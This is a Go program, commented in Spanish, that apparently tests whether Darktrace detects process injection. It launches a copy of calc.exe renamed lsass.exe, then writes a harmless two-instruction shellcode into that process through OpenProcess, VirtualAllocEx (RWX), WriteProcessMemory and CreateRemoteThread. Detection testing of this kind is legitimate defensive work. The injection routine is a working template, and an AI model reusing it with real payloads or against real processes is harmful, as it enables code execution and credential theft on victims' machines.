package main

import (
    "fmt"
    "io"
    "os"
    "os/exec"
    "path/filepath"
    "strconv"
    "strings"
    "syscall"
    "time"
    "unsafe"
)

var (
    fakeProcess *os.Process
    kernel32    = syscall.NewLazyDLL("kernel32.dll")
)

// Shellcode inofensivo que solo hace un retorno inmediato
var shellcode = []byte{
    0x48, 0x31, 0xC0, // xor rax, rax
    0xC3,             // ret
}

func main() {
    fmt.Println("🎯 INYECTOR LSASS - CON INYECCIÓN REAL")
    fmt.Println("🎯 ===================================")

    testDir := "C:\\TestAlert"
    fmt.Printf("[1] Creando %s... ", testDir)
    os.RemoveAll(testDir)
    os.MkdirAll(testDir, 0755)
    fmt.Println("✅")

    srcCalc := "C:\\Windows\\System32\\calc.exe"
    dstLsass := filepath.Join(testDir, "lsass.exe")

    fmt.Printf("[2] Copiando calc.exe -> lsass.exe... ")
    if err := copyFile(srcCalc, dstLsass); err != nil {
        fmt.Printf("❌ Error: %v\n", err)
        os.Exit(1)
    }
    fmt.Println("✅")

    fmt.Printf("[3] Matando calc.exe anteriores... ")
    exec.Command("taskkill", "/f", "/im", "calc.exe").Run()
    time.Sleep(1 * time.Second)
    fmt.Println("✅")

    fmt.Printf("[4] Ejecutando lsass.exe falso... ")
    pid, err := startAndKeepProcess(dstLsass)
    if err != nil {
        fmt.Printf("❌ Error: %v\n", err)

        pid = startWithCmd(dstLsass)
        if pid == 0 {
            os.Exit(1)
        }
    }
    fmt.Printf("✅ PID: %d\n", pid)

    time.Sleep(3 * time.Second)

    fmt.Printf("[5] Verificando proceso PID %d... ", pid)
    if !isProcessAlive(pid) {
        fmt.Println("❌ No responde")
        fmt.Println("   Intentando método alternativo...")

        pid = startWithPowerShell(dstLsass)
        if pid == 0 {
            fmt.Println("❌ Falló completamente")
            os.Exit(1)
        }
        time.Sleep(2 * time.Second)
    }
    fmt.Println("✅ VIVO")

    fmt.Println("\n⚠️  EJECUTANDO INYECCIÓN REAL...")
    performRealInjection(pid)

    fmt.Println("\n⏳ Manteniendo proceso activo 30s para detección...")
    for i := 1; i <= 30; i++ {
        fmt.Printf("\r   Tiempo restante: %2d segundos", 30-i)
        time.Sleep(1 * time.Second)

        if !isProcessAlive(pid) {
            fmt.Println("\n❌ Proceso murió prematuramente")
            break
        }
    }

    fmt.Println("\n\n✅ PRUEBA COMPLETADA")
    fmt.Println("✅ Darktrace debería haber detectado:")
    fmt.Println("   - Evento: INJECTION (REAL)")
    fmt.Println("   - Target: lsass.exe (falso)")
    fmt.Println("   - Inyección: SHELLCODE REAL EJECUTADO")
    fmt.Println("   - Path: C:\\TestAlert\\lsass.exe")

    fmt.Println("\n¿Limpiar? (s/n): ")
    var response string
    fmt.Scanln(&response)

    if strings.ToLower(response) == "s" {
        cleanup(pid, dstLsass, testDir)
    } else {
        fmt.Printf("Proceso lsass.exe falso sigue en PID: %d\n", pid)
        fmt.Printf("Archivo: %s\n", dstLsass)
    }
}

// FUNCIÓN DE INYECCIÓN REAL (REEMPLAZA LA SIMULADA)
func performRealInjection(targetPID int) {
    fmt.Println("🔧 REALIZANDO INYECCIÓN REAL...")
    
    // 1. OpenProcess con acceso necesario
    fmt.Printf("[1] OpenProcess(PROCESS_ALL_ACCESS) en PID %d... ", targetPID)
    
    PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
    hProcess, _, err := kernel32.NewProc("OpenProcess").Call(
        uintptr(PROCESS_ALL_ACCESS),
        uintptr(0),
        uintptr(targetPID),
    )
    
    if hProcess == 0 {
        fmt.Printf("❌ Error: %v\n", err)
        return
    }
    fmt.Println("✅")
    
    // 2. VirtualAllocEx para reservar memoria
    fmt.Print("[2] VirtualAllocEx reservando memoria... ")
    
    MEM_COMMIT := uint32(0x00001000)
    MEM_RESERVE := uint32(0x00002000)
    PAGE_EXECUTE_READWRITE := uint32(0x40)
    
    allocAddr, _, _ := kernel32.NewProc("VirtualAllocEx").Call(
        hProcess,
        0,
        uintptr(len(shellcode)),
        uintptr(MEM_COMMIT|MEM_RESERVE),
        uintptr(PAGE_EXECUTE_READWRITE),
    )
    
    if allocAddr == 0 {
        fmt.Println("❌")
        kernel32.NewProc("CloseHandle").Call(hProcess)
        return
    }
    fmt.Printf("✅ (Dirección: 0x%X)\n", allocAddr)
    
    // 3. WriteProcessMemory para escribir shellcode
    fmt.Print("[3] WriteProcessMemory escribiendo shellcode... ")
    
    var bytesWritten uintptr
    success, _, _ := kernel32.NewProc("WriteProcessMemory").Call(
        hProcess,
        allocAddr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
        uintptr(unsafe.Pointer(&bytesWritten)),
    )
    
    if success == 0 {
        fmt.Println("❌")
        kernel32.NewProc("CloseHandle").Call(hProcess)
        return
    }
    fmt.Printf("✅ (%d bytes escritos)\n", bytesWritten)
    
    // 4. CreateRemoteThread para ejecutar el shellcode
    fmt.Print("[4] CreateRemoteThread ejecutando shellcode... ")
    
    hThread, _, _ := kernel32.NewProc("CreateRemoteThread").Call(
        hProcess,
        0,
        0,
        allocAddr,
        0,
        0,
        0,
    )
    
    if hThread == 0 {
        fmt.Println("❌")
        kernel32.NewProc("CloseHandle").Call(hProcess)
        return
    }
    fmt.Println("✅")
    
    // 5. Esperar a que termine
    fmt.Print("[5] WaitForSingleObject esperando ejecución... ")
    kernel32.NewProc("WaitForSingleObject").Call(
        hThread,
        uintptr(2000), // 2 segundos
    )
    fmt.Println("✅")
    
    // 6. Limpiar
    kernel32.NewProc("CloseHandle").Call(hThread)
    kernel32.NewProc("CloseHandle").Call(hProcess)
    
    fmt.Println("🎯 ¡INYECCIÓN REAL COMPLETADA!")
    fmt.Println("   - Shellcode escrito en memoria del proceso")
    fmt.Println("   - Hilo remoto creado y ejecutado")
    fmt.Println("   - Código ejecutado exitosamente")
}

// FUNCIÓN ORIGINAL DE SIMULACIÓN (MANTENIDA COMO BACKUP)
func generateInjectionEvents(pid int) {
    fmt.Println("⚠️  GENERANDO EVENTOS DE INYECCIÓN (SIMULACIÓN)...")
    
    accessLevels := []uintptr{
        0x0400,
        0x0010,
        0x0020,
        0x0008,
        0x0002,
        0x1F0FFF,
    }

    for i := 1; i <= 10; i++ {
        access := accessLevels[i%len(accessLevels)]

        fmt.Printf("[%d] OpenProcess(0x%X) -> PID %d... ", i, access, pid)

        hProcess, _, _ := kernel32.NewProc("OpenProcess").Call(
            access,
            0,
            uintptr(pid),
        )

        if hProcess != 0 {
            fmt.Println("✅")

            fmt.Println("   ├─ VirtualAllocEx (MEM_COMMIT, PAGE_READWRITE)")
            fmt.Println("   ├─ WriteProcessMemory (shellcode)")
            fmt.Println("   └─ CreateRemoteThread (LoadLibraryW)")
            fmt.Println("   ⚠️  ¡EVENTO DE INYECCIÓN!")

            kernel32.NewProc("CloseHandle").Call(hProcess)
        } else {
            fmt.Println("❌ (sin permisos)")
            fmt.Println("   ⚠️  Pero el INTENTO genera logs igual")
        }

        time.Sleep(500 * time.Millisecond)
    }
}

// FUNCIONES ORIGINALES (SIN CAMBIOS)

func copyFile(src, dst string) error {
    in, err := os.Open(src)
    if err != nil {
        return err
    }
    defer in.Close()

    out, err := os.Create(dst)
    if err != nil {
        return err
    }
    defer out.Close()

    _, err = io.Copy(out, in)
    return err
}

func startAndKeepProcess(exePath string) (int, error) {
    cmd := exec.Command(exePath)

    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr

    if err := cmd.Start(); err != nil {
        return 0, err
    }

    fakeProcess = cmd.Process

    go func() {
        cmd.Wait()
    }()

    return cmd.Process.Pid, nil
}

func startWithCmd(exePath string) int {
    cmd := exec.Command("cmd.exe", "/c", "start", "/B", exePath)
    cmd.Start()
    time.Sleep(2 * time.Second)

    return findCalcPID()
}

func startWithPowerShell(exePath string) int {
    psCmd := fmt.Sprintf(`$p = Start-Process "%s" -PassThru -WindowStyle Hidden; $p.Id`, exePath)
    cmd := exec.Command("powershell", "-Command", psCmd)

    output, err := cmd.Output()
    if err != nil {
        return 0
    }

    pidStr := strings.TrimSpace(string(output))
    pid, _ := strconv.Atoi(pidStr)
    return pid
}

func findCalcPID() int {
    cmd := exec.Command("tasklist", "/fi", "imagename eq calc.exe", "/fo", "csv", "/nh")
    output, err := cmd.Output()
    if err != nil {
        return 0
    }

    lines := strings.Split(strings.TrimSpace(string(output)), "\r\n")
    for _, line := range lines {
        if strings.Contains(line, "calc.exe") {
            parts := strings.Split(line, "\",\"")
            if len(parts) >= 2 {
                pidStr := strings.Trim(parts[1], "\"")
                if pid, err := strconv.Atoi(pidStr); err == nil {
                    return pid
                }
            }
        }
    }

    return 0
}

func isProcessAlive(pid int) bool {
    cmd := exec.Command("tasklist", "/fi", "pid eq "+strconv.Itoa(pid))
    output, err := cmd.Output()
    if err != nil {
        return false
    }

    return strings.Contains(string(output), strconv.Itoa(pid))
}

func cleanup(pid int, exePath, testDir string) {
    fmt.Println("\n🧹 LIMPIANDO...")

    fmt.Printf("  Matando PID %d... ", pid)
    exec.Command("taskkill", "/f", "/pid", strconv.Itoa(pid)).Run()
    time.Sleep(1 * time.Second)
    fmt.Println("✅")

    fmt.Printf("  Eliminando %s... ", filepath.Base(exePath))
    os.Remove(exePath)
    fmt.Println("✅")

    fmt.Printf("  Eliminando %s... ", testDir)
    os.RemoveAll(testDir)
    fmt.Println("✅")

    fmt.Println("✅ Limpieza completada")
}
